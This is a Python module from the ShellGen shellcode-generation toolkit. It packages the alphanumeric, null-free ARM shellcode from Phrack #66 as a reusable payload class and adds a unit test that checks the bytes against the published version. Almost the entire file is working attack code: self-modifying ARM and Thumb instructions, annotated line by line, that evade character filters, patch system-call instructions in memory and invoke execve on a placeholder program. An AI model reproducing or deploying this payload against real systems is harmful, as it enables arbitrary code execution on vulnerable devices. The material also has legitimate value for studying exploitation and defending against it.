#!/usr/bin/env python

###############################################################################
## Example shellcode from Phrack #66                                         ##
## Shellcode for ShellGen                                                    ##
###############################################################################

# Copyright (c) 2012-2013 Mario Vilas
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
# MA 02110-1301, USA.

"Example shellcode from Phrack #66."

__all__ = ["Phrack66"]

from shellgen import Static

#-----------------------------------------------------------------------------#

class Phrack66 (Static):
    """
    Example shellcode from Phrack #66.

    U{http://www.phrack.org/issues.html?issue=66&id=12}
    """

    qualities = "payload"
    encoding  = "nullfree, ascii, alpha"

    bytes = (

    # our shellcode starts here
    # nops
    "\x38\x30\x41\x52"  # SUBPL    r3, r1, #56
    "\x38\x30\x41\x52"  # SUBPL    r3, r1, #56
    # do not change these instructions
    # we will use them to load a value
    # into our register
    "\x38\x30\x41\x52"  # SUBPL    r3, r1, #56
    "\x38\x30\x41\x52"  # SUBPL    r3, r1, #56
    # continue nops
    "\x38\x30\x41\x52"  # SUBPL    r3, r1, #56
    "\x38\x30\x41\x52"  # SUBPL    r3, r1, #56
    "\x38\x30\x41\x52"  # SUBPL    r3, r1, #56
    "\x38\x30\x41\x52"  # SUBPL    r3, r1, #56
    "\x38\x30\x41\x52"  # SUBPL    r3, r1, #56
    "\x38\x30\x41\x52"  # SUBPL    r3, r1, #56
    "\x38\x30\x41\x52"  # SUBPL    r3, r1, #56
    "\x38\x30\x41\x52"  # SUBPL    r3, r1, #56
    "\x38\x30\x41\x52"  # SUBPL    r3, r1, #56
    "\x38\x30\x41\x52"  # SUBPL    r3, r1, #56
    "\x38\x30\x41\x52"  # SUBPL    r3, r1, #56
    "\x38\x30\x41\x52"  # SUBPL    r3, r1, #56
    "\x38\x30\x41\x52"  # SUBPL    r3, r1, #56
    "\x38\x30\x41\x52"  # SUBPL    r3, r1, #56
    "\x38\x30\x41\x52"  # SUBPL    r3, r1, #56
    "\x38\x30\x41\x52"  # SUBPL    r3, r1, #56
    "\x38\x30\x41\x52"  # SUBPL    r3, r1, #56
    "\x38\x30\x41\x52"  # SUBPL    r3, r1, #56
    "\x38\x30\x41\x52"  # SUBPL    r3, r1, #56
    "\x38\x30\x41\x52"  # SUBPL    r3, r1, #56
    "\x38\x30\x41\x52"  # SUBPL    r3, r1, #56
    "\x38\x30\x41\x52"  # SUBPL    r3, r1, #56
    "\x38\x30\x41\x52"  # SUBPL    r3, r1, #56

    # !!! this one missing from the .c version !!!
##    "\x38\x30\x41\x52"  # SUBPL    r3, r1, #56

    # we can't load directly from
    # PC so we must get PC into r3
    # we do this by subtracting 48
    # from PC
    "\x30\x30\x4f\x42"  # SUBMI    r3, pc, #48
    "\x30\x30\x4f\x52"  # SUBPL    r3, pc, #48

    # load 56 into r3
    "\x30\x30\x53\x55"  # LDRPLB   r3, [r3, #-48]
    "\x30\x30\x53\x45"  # LDRMIB   r3, [r3, #-48]

    # Set r5 to -1
    # update the flags: result is negative
    # so we know we need MI from now on
    "\x39\x50\x53\x42"  # SUBMIS   r5, r3, #57
    "\x39\x50\x53\x52"  # SUBPLS   r5, r3, #57

    # r7 to stackpointer
    "\x30\x70\x4d\x42"  # SUBMI    r7, SP, #48
    # Set r3 to 0
    # set positive flag
    "\x38\x30\x53\x42"  # SUBMIS   r3, r3, #56
    # set r4 to 0
    "\x63\x41\x43\x50"  # SUBPL    r4, r3, r3, ROR #2
    # Set r6 to 0
    "\x64\x61\x44\x50"  # SUBPL    r6, r4, r4, ROR #2

    # store registers to stack
    "\x71\x41\x47\x59"  # STMPLFD  r7, {r0, r4, r5, r6, r8, lr}^

    # r5 to -121
    "\x79\x50\x44\x52"  # SUBPL    r5, r4, #121

    # copy PC to r6
    "\x65\x61\x4f\x50"  # SUBPL    r6, PC, r5, ROR #2

    "\x65\x61\x46\x50"  # SUBPL    r6, r6, r5, ROR #2
    "\x65\x61\x46\x50"  # SUBPL    r6, r6, r5, ROR #2
    "\x65\x61\x46\x50"  # SUBPL    r6, r6, r5, ROR #2
    "\x65\x61\x46\x50"  # SUBPL    r6, r6, r5, ROR #2
    "\x65\x61\x46\x50"  # SUBPL    r6, r6, r5, ROR #2
    "\x65\x61\x46\x50"  # SUBPL    r6, r6, r5, ROR #2

    # write 0 to SWI 0x414141
    # becomes: SWI 0x410041
    # OFFSET USED HERE
    # IF CODE CHANGES, CHANGE OFFSET
    "\x64\x30\x46\x55"  # STRPLB   r3, [r6, #-100]

    # put 56 back into r3
    # we are positive after this
    "\x38\x30\x33\x52"  # EORPLS   r3, r3, #56

    "\x39\x70\x43\x52"  # SUBPL    r7, r3, #57

    # write 9F to SWI 0x410041
    # becomes SWI 0x9F0041
    # we are negative after this
    "\x50\x50\x37\x52"  # EORPLS   r5, r7, #80
    # negative
    "\x30\x50\x35\x42"  # EORMIS   r5, r5, #48
    # OFFSET USED HERE
    # IF CODE CHANGES, CHANGE OFFSET
    "\x63\x50\x46\x45"  # STRMIB   r5, [r6, #-99]

    # write 2 to SWI 0x9F0041
    # becomes SWI 0x9F0002
    "\x36\x50\x43\x42"  # SUBMI r5, r3, #54
    "\x65\x50\x46\x45"  # STRMIB   r5, [r6, #-101]

    # write 0x16 to 0x41303030
    # becomes 0x41303016
    # positive
    "\x42\x50\x33\x42"  # EORMIS   r5, r3, #66
    "\x6c\x50\x35\x52"  # EORPLS   r5, r5, #108
    # OFFSET USED HERE
    # IF CODE CHANGES, CHANGE OFFSET
    "\x59\x50\x46\x55"  # STRPLB   r5, [r6, #-89]

    # write 2F to 0x41303016
    # becomes 0x412F3016
    "\x56\x50\x33\x52"  # EORPLS   r5, r3, #86
    "\x41\x50\x35\x52"  # EORPLS   r5, r5, #65
    # OFFSET USED HERE
    # IF CODE CHANGES, CHANGE OFFSET
    "\x57\x50\x46\x55"  # STRPLB   r5, [r6, #-87]

    # write FF to 0x412FFF16
    # becomes 0x412FFF16 (BXPL r6)
    # OFFSET USED HERE
    # IF CODE CHANGES, CHANGE OFFSET
    "\x58\x70\x46\x55"  # STRPLB   r7, [r6, #-88]

    # r7 = -1
    # set r3 to  -121
    "\x78\x30\x47\x52"  # SUBPL    r3, r7, #120
    #
    "\x63\x61\x46\x50"  # SUBPL    r6, r6, r3, ROR #2

    # write DF for swi to 0x3030
    # becomes 0xDF30 (SWI 48)
    # becomes negative
    "\x61\x50\x37\x52"  # EORPLS   r5, r7, #97
    "\x41\x50\x35\x42"  # EORMIS   r5, r5, #65
    # OFFSET USED HERE
    # IF CODE CHANGES, CHANGE OFFSET
    "\x49\x50\x46\x45"  # STRMIB   r5, [r6, #-73]

    # Set positive flag
    "\x38\x70\x34\x42"  # EORMIS   r7, r4, #56

    # load arguments for SWI
    # r0 = 0, r1 = -1, r2 = 0
    "\x30\x50\x4d\x52"  # SUBPL    r5, SP, #48
    # We use LDMPLFA, because it's one of the few instructions
    # we can use to write to the registers R0 to R2.
    # Other instructions generate non-alphanumeric characters
    "\x47\x41\x35\x58"  # LDMPLFA  r5!, {r0, r1, r2, r6, r8, lr}

    # Set r7 to -1
    # Negative after this
    "\x39\x70\x57\x52"  # SUBPLS   r7, r7, #57

    # This will become:
    # SWIMI 0x9f0002
    "\x41\x41\x41\x4f"  # SWIMI    0x414141

    # Set positive flag again
    "\x38\x50\x34\x42"  # EORMIS   r5, r4, #56

    # set thumb mode
    "\x67\x61\x4f\x50"  # SUBPL    r6, pc, r7, ROR #2

    # this should be BXPL r6
    # but in hex that's
    # 0x51 0x2f 0xff 0x16, so we
    # overwrite the 0x30 above
    "\x30\x30\x30\x51"  # .byte    0x30,0x30,0x30,0x51

                        # .THUMB
                        # .ALIGN 2
    # We assume r2 is 0 before
    # entering Thumb mode

    # copy pc to r0
    "\x78\x46"          # mov    r0, pc

    # OFFSET USED HERE
    # IF CODE CHANGES, CHANGE OFFSET
    # misalign r0 to address of 1execme2 - 47
    # we will write to r0+47 and r0+54
    # (beginning of the string)
    "\x64\x30"          # add    r0, #100
    "\x69\x38"          # sub    r0, #105

    # set r1 to 0
    "\x51\x43"          # mul    r1, r2
    # set r1 tp 47
    "\x61\x31"          # add    r1, #97
    "\x32\x39"          # sub    r1, #50
    # store r1 ('/') at r0+47
    # string becomes /execme2
    "\x41\x54"          # strb   r1, [r0, r1]

    # set r1 to 0
    "\x51\x43"          # mul    r1, r2
    # set r1 to 54
    "\x36\x31"          # add    r1, #54
    # store 0 at r0+54
    # string becomes /execme\0
    "\x42\x54"          # strb   r2, [r0, r1]

    # set r1 to 0
    "\x51\x43"          # mul    r1, r2
    # set r1 to -1
    "\x30\x31"          # add    r1, #48
    "\x31\x39"          # sub    r1, #49
    # set r7 to 1
    "\x4f\x42"          # neg    r7, r1

    # set r1 to 0
    "\x51\x43"          # mul    r1, r2
    # set r1 to 11 (0xb),
    # the exec system call code
    "\x41\x31"          # add    r1, #65
    "\x36\x39"          # sub    r1, #54
    # our systemcall code must be in r7
    # r7 = 1, r1 contains the code
    "\x4f\x43"          # mul    r7, r1

    # set r1 to 0 (first parameter of execve)
    "\x51\x43"          # mul    r1, r2

    # set r0 to beginning of the string
    "\x61\x30"          # add    r0, #97
    "\x32\x38"          # sub    r0, #50

    # This wil become: swi  48
    "\x30\x30"          # .byte  0x30,0x30
    # This is a nop used for
    # alignment
    "\x32\x37"          # add    r7, #50
    # our command
    "1execme2"  # .ascii "1execme2"
    # nops used for alignment
    "\x32\x37"          # add    r7, #50
    "\x32\x37"          # add    r7, #50
    )

#-----------------------------------------------------------------------------#

def test():
    "Unit test."

    # Compare against the exact bytes listed in the Phrack magazine.
    # This test must be removed once the shellcode is modified to do
    # something useful instead of running "/execme".
    assert Phrack66().bytes == (
        "\x38\x30\x41\x52\x38\x30\x41\x52\x38\x30\x41"
        "\x52\x38\x30\x41\x52\x38\x30\x41\x52\x38\x30\x41\x52\x38\x30\x41"
        "\x52\x38\x30\x41\x52\x38\x30\x41\x52\x38\x30\x41\x52\x38\x30\x41"
        "\x52\x38\x30\x41\x52\x38\x30\x41\x52\x38\x30\x41\x52\x38\x30\x41"
        "\x52\x38\x30\x41\x52\x38\x30\x41\x52\x38\x30\x41\x52\x38\x30\x41"
        "\x52\x38\x30\x41\x52\x38\x30\x41\x52\x38\x30\x41\x52\x38\x30\x41"
        "\x52\x38\x30\x41\x52\x38\x30\x41\x52\x38\x30\x41\x52\x38\x30\x41"
        "\x52\x30\x30\x4f\x42\x30\x30\x4f\x52\x30\x30\x53\x55\x30\x30\x53"
        "\x45\x39\x50\x53\x42\x39\x50\x53\x52\x30\x70\x4d\x42\x38\x30\x53"
        "\x42\x63\x41\x43\x50\x64\x61\x44\x50\x71\x41\x47\x59\x79\x50\x44"
        "\x52\x65\x61\x4f\x50\x65\x61\x46\x50\x65\x61\x46\x50\x65\x61\x46"
        "\x50\x65\x61\x46\x50\x65\x61\x46\x50\x65\x61\x46\x50\x64\x30\x46"
        "\x55\x38\x30\x33\x52\x39\x70\x43\x52\x50\x50\x37\x52\x30\x50\x35"
        "\x42\x63\x50\x46\x45\x36\x50\x43\x42\x65\x50\x46\x45\x42\x50\x33"
        "\x42\x6c\x50\x35\x52\x59\x50\x46\x55\x56\x50\x33\x52\x41\x50\x35"
        "\x52\x57\x50\x46\x55\x58\x70\x46\x55\x78\x30\x47\x52\x63\x61\x46"
        "\x50\x61\x50\x37\x52\x41\x50\x35\x42\x49\x50\x46\x45\x38\x70\x34"
        "\x42\x30\x50\x4d\x52\x47\x41\x35\x58\x39\x70\x57\x52\x41\x41\x41"
        "\x4f\x38\x50\x34\x42\x67\x61\x4f\x50\x30\x30\x30\x51\x78\x46\x64"
        "\x30\x69\x38\x51\x43\x61\x31\x32\x39\x41\x54\x51\x43\x36\x31\x42"
        "\x54\x51\x43\x30\x31\x31\x39\x4f\x42\x51\x43\x41\x31\x36\x39\x4f"
        "\x43\x51\x43\x61\x30\x32\x38\x30\x30\x32\x37\x31\x65\x78\x65\x63"
        "\x6d\x65\x32\x32\x37\x32\x37"
    )
